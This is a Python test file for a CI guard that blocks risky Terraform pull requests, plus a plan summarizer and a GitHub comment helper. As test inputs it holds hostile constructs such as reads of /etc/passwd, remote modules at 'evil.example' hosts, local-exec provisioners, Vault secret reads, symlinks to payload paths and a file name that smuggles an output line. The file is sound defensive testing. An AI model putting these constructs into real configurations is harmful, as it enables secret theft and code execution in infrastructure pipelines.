#!/usr/bin/env python3
"""Tests for tf-plan-guard.py and tf-plan-summary.py (PET-866). Run: python3 scripts/test-tf-plan.py"""
import json
import os
import subprocess
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
G = os.path.join(HERE, "tf-plan-guard.py")
S = os.path.join(HERE, "tf-plan-summary.py")


def run(*a, **k):
    return subprocess.run(a, capture_output=True, text=True, **k)


def repo(path, content):
    git = lambda *a: run("git", "-C", path, "-c", "user.email=t@t", "-c", "user.name=t", *a)
    git("init", "-q", "-b", "main")
    os.makedirs(os.path.join(path, "environments/homelab"))
    open(os.path.join(path, "environments/homelab/a.tf"), "w").write("a = 1\n")
    git("add", "-A"); git("commit", "-qm", "base")
    git("checkout", "-qb", "pr")
    open(os.path.join(path, "environments/homelab/a.tf"), "a").write(content)
    git("commit", "-qam", "pr")


def guard(content):
    with tempfile.TemporaryDirectory() as d:
        repo(d, content)
        return run(sys.executable, G, d, "--base", "main", "--head", "pr").returncode


def guard2(path, content):
    with tempfile.TemporaryDirectory() as d:
        repo(d, "b = 2\n")
        git = lambda *a: run("git", "-C", d, "-c", "user.email=t@t", "-c", "user.name=t", *a)
        full = os.path.join(d, path)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        open(full, "a").write(content)
        git("add", "-A"); git("commit", "-qm", "x")
        return run(sys.executable, G, d, "--base", "main", "--head", "pr").returncode


def symlink_case():
    with tempfile.TemporaryDirectory() as d:
        repo(d, "b = 2\n")
        os.symlink("../../payload.txt", os.path.join(d, "environments/homelab/extra.tf"))
        run("git", "-C", d, "add", "-A")
        run("git", "-C", d, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "s")
        return run(sys.executable, G, d, "--base", "main", "--head", "pr").returncode


def real_tree_case():
    """Touching any current homelab or reviewed-module file must not be refused."""
    import shutil
    root = os.path.dirname(HERE)
    bad = []
    with tempfile.TemporaryDirectory() as d:
        for sub in ("environments/homelab", "modules/proxmox-lxc", "modules/postgres-db",
                    "modules/cloudflare-ingress"):
            shutil.copytree(os.path.join(root, sub), os.path.join(d, sub),
                            ignore=shutil.ignore_patterns(".terraform", "*.tfstate*", "vault-config"))
        git = lambda *a: run("git", "-C", d, "-c", "user.email=t@t", "-c", "user.name=t", *a)
        git("init", "-q", "-b", "main"); git("add", "-A"); git("commit", "-qm", "base")
        git("checkout", "-qb", "pr")
        targets = []
        for sub in ("environments/homelab", "modules/proxmox-lxc", "modules/postgres-db",
                    "modules/cloudflare-ingress"):
            for f in sorted(os.listdir(os.path.join(d, sub))):
                if f.endswith(".tf"):
                    targets.append(f"{sub}/{f}")
        # Files that define a provider destination are refused on purpose.
        deliberate = {"environments/homelab/providers.tf", "environments/homelab/variables.tf",
                      "environments/homelab/versions.tf", "environments/homelab/backend.tf",
                      "environments/homelab/minio-state-backend.tf",
                      # Uses modules/baremetal-host, which holds a local-exec provisioner.
                      "environments/homelab/ollama.tf",
                      "modules/proxmox-lxc/versions.tf", "modules/postgres-db/versions.tf",
                      "modules/cloudflare-ingress/versions.tf"}
        for t in targets:
            if t in deliberate:
                continue
            git("checkout", "-q", "main"); git("checkout", "-q", "-B", "pr")
            open(os.path.join(d, t), "a").write("\n# touched\n")
            git("commit", "-qam", "t")
            rc = run(sys.executable, G, d, "--base", "main", "--head", "pr").returncode
            if rc != 0:
                bad.append(t)
    print("  refused real files:", bad if bad else "none", f"({len(targets)} candidates)")
    return len(bad)


def module_symlink_case():
    with tempfile.TemporaryDirectory() as d:
        repo(d, "b = 2\n")
        git = lambda *a: run("git", "-C", d, "-c", "user.email=t@t", "-c", "user.name=t", *a)
        os.makedirs(os.path.join(d, "modules/postgres-db"))
        open(os.path.join(d, "modules/postgres-db/main.tf"), "w").write("x = 1\n")
        git("add", "-A"); git("commit", "-qm", "m")
        git("checkout", "-qb", "pr2")
        run("git", "-C", d, "rm", "-rq", "modules/postgres-db")
        os.makedirs(os.path.join(d, "modules"), exist_ok=True)
        os.symlink("../payload", os.path.join(d, "modules/postgres-db"))
        git("add", "-A"); git("commit", "-qm", "s")
        return run(sys.executable, G, d, "--base", "pr", "--head", "pr2").returncode


def check(name, got, want):
    ok = got == want
    print(("PASS " if ok else "FAIL ") + name, "" if ok else f"(got {got}, want {want})")
    return ok


results = [
    check("plain resource passes", guard('resource "x" "y" {}\n'), 0),
    check("local-exec refused", guard('provisioner "local-exec" {}\n'), 1),
    check("external data refused", guard('data "external" "x" {}\n'), 1),
    check("remote module refused", guard('  source = "git::https://x/y"\n'), 1),
    check("reviewed module passes", guard('  source = "../../modules/proxmox-lxc"\n'), 0),
    check("other local module refused", guard('  source = "../../payload"\n'), 1),
    check("provider block refused", guard('provider "x" {}\n'), 1),
    check("nonsensitive refused", guard('x = nonsensitive(var.t)\n'), 1),
    check("file read refused", guard('x = file("/etc/passwd")\n'), 1),
    check("tfvars refused", guard2("environments/homelab/r.auto.tfvars", 'proxmox_endpoint="x"\n'), 1),
    check("providers.tf refused", guard2("environments/homelab/providers.tf", "# c\n"), 1),
    check("symlink refused", symlink_case(), 1),
    check("symlink replacing a module directory refused", module_symlink_case(), 1),
    check("tab in file name still inspected", guard2("environments/homelab/a\tb.tf", 'data "external" "x" {}\n'), 1),
    check("real tree is not falsely refused", real_tree_case(), 0),
    check("tf file elsewhere does not refuse a homelab PR", guard2("payload/main.tf", "x = 1\n"), 0),
    check("unicode escape refused", guard('data "vault\\u005fkv_secret_v2" "x" {}\n'), 1),
    check("vault_path edit in a file that reads Vault refused",
          guard('data vault_x y {}\n  vault_path = "iac/minio"\n'), 1),
    check("comment cannot hide a token", guard("# no provisioner here\n"), 1),
    check("one-line module with remote source refused",
          guard('module "x" { source = "git::https://evil.example/x.git" }\n'), 1),
    check("filebase64sha256 refused", guard('x = filebase64sha256("/a")\n'), 1),
    check("new vault data source refused", guard('data "vault_kv_secret_v2" "s" {}\n'), 1),
    check("comment between source and = refused",
          guard('module "x" { source /* c */ = "git::https://evil/x.git" }\n'), 1),
    check("comment before provider label refused", guard('provider /* c */ "vault" {}\n'), 1),
    check("provider meta-argument refused", guard('  provider = vault.e\n'), 1),
    check("// comment in provider block refused", guard('provider //x\n"vault" {}\n'), 1),
    check("// comment before meta-argument refused", guard('  provider //x\n= proxmox.x\n'), 1),
    check("// comment in data label refused", guard('data //x\n"vault_kv_secret_v2" "s" {}\n'), 1),
    check("// comment in source refused", guard('module "m" { source //x\n= "git::https://evil/x" }\n'), 1),
    check("// comment in backend refused", guard('terraform { backend //x\n"s3" {} }\n'), 1),
    check("cloud block refused", guard('terraform { cloud { hostname = "evil.example" } }\n'), 1),
    check("# comment in provider refused", guard('provider #x\n"vault" {}\n'), 1),
    check("homelab subdirectory scanned", guard2("environments/homelab/sub/x.tf", 'provisioner "local-exec" {}\n'), 1),
    check("unquoted vault label refused", guard('data vault_generic_secret leak {}\n'), 1),
    check("unquoted external label refused", guard('data external x {}\n'), 1),
    check(".terraform directory refused", guard2("environments/homelab/.terraform/modules/modules.json", "{}\n"), 1),
    check("datastore local passes", guard('datastore_id = "local"\n'), 0),
    check("newline in file name refused", guard2("environments/homelab/z\nPLANNED_PATHS=rc=0\nz.tf", "x = 1\n"), 1),
    check("inline comment in data type refused", guard('data /* x */ "external" "r" {}\n'), 1),
    check("comment before call paren refused", guard('x = file /* x */ ("/etc/passwd")\n'), 1),

]
with tempfile.TemporaryDirectory() as d:
    check_empty = run(sys.executable, G, d).returncode
    results.append(check("not a repo is an error, not a pass", check_empty, 2))

plan = {"prior_state": {"values": {"root_module": {"resources": [{}, {}]}}},
        "resource_changes": [{"address": "a.b", "change": {"actions": ["delete"]}}]}
with tempfile.NamedTemporaryFile("w", suffix=".json", delete=False) as f:
    json.dump(plan, f)
r = run(sys.executable, S, f.name)
results.append(check("destroy is flagged", "removes 1" in r.stdout and r.returncode == 0, True))
plan["prior_state"] = {}
with open(f.name, "w") as g:
    json.dump(plan, g)
plan["resource_changes"] = [{"address": 'x.y["sekrit"]', "change": {"actions": ["create"]}}]
plan["prior_state"] = {"values": {"root_module": {"resources": [{}]}}}
with open(f.name, "w") as g:
    json.dump(plan, g)
r = run(sys.executable, S, f.name)
results.append(check("instance keys redacted", "sekrit" not in r.stdout and "x.y[…]" in r.stdout, True))
plan["prior_state"] = {}
with open(f.name, "w") as g:
    json.dump(plan, g)
plan["resource_changes"] = [{"address": 'x.y["a]SECRET"]', "change": {"actions": ["create"]}}]
plan["prior_state"] = {"values": {"root_module": {"resources": [{}]}}}
with open(f.name, "w") as g:
    json.dump(plan, g)
r = run(sys.executable, S, f.name)
results.append(check("bracket inside key stays redacted", "SECRET" not in r.stdout, True))
plan["prior_state"] = {}
with open(f.name, "w") as g:
    json.dump(plan, g)
plan["resource_changes"] = [{"address": "a.b", "change": {"actions": ["no-op"], "importing": {"id": "1"}}},
                            {"address": "c.d", "change": {"actions": ["forget"]}}]
plan["prior_state"] = {"values": {"root_module": {"resources": [{}]}}}
with open(f.name, "w") as g:
    json.dump(plan, g)
r = run(sys.executable, S, f.name)
results.append(check("import and forget are listed, not 'no changes'",
                     "No changes" not in r.stdout and "a.b" in r.stdout and "forget" in r.stdout, True))
plan["prior_state"] = {}
with open(f.name, "w") as g:
    json.dump(plan, g)
results.append(check("empty state fails", run(sys.executable, S, f.name).returncode, 1))
def gh_case():
    """The comment upsert must not edit a comment that another user wrote."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("g", os.path.join(HERE, "tf-plan-gh.py"))
    g = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(g)
    calls = []

    def api(method, path, body=None):
        calls.append(method)
        if method == "GET":
            return [{"id": 1, "user": {"login": "mallory"}, "body": g.MARK + "x"}]
        return {}
    g.api = api
    with tempfile.NamedTemporaryFile("w", delete=False) as f:
        f.write("hi")
    g.upsert("7", f.name)
    os.unlink(f.name)
    return calls[-1]


def find_pr_case():
    """With stacked PRs, only the PR named by the trigger, at this head, is planned."""
    import importlib.util
    spec = importlib.util.spec_from_file_location("g2", os.path.join(HERE, "tf-plan-gh.py"))
    g = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(g)
    g.api = lambda m, p, b=None: [
        {"state": "open", "number": 9, "head": {"sha": "other"}, "base": {"ref": "main"}},
        {"state": "open", "number": 7, "head": {"sha": "abc"}, "base": {"ref": "main"}}]
    with tempfile.NamedTemporaryFile("w", delete=False) as f:
        os.environ["GITHUB_OUTPUT"] = f.name
    g.find_pr("abc", "7")
    got = open(os.environ["GITHUB_OUTPUT"]).read()
    os.unlink(os.environ["GITHUB_OUTPUT"])
    return "number=7" in got and "skip=false" in got


results.append(check("find-pr picks the triggering PR at this head", find_pr_case(), True))
results.append(check("another user's marked comment is not edited", gh_case(), "POST"))
sys.exit(0 if all(results) else 1)
